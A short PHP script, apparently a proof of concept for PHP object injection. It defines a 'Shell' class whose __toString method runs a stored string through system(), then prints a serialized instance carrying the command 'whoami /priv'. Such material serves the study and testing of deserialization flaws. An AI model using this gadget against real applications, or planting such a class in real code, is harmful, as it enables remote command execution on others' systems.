<?php


class Shell{
    public $command;
    public function __construct($pcommand){
        $this->command = $pcommand;
    }
    public function __toString(){
        system($this->command);
    }
}


$serialiedStr = serialize(new Shell("whoami /priv"));
echo $serialiedStr . "\n";

?>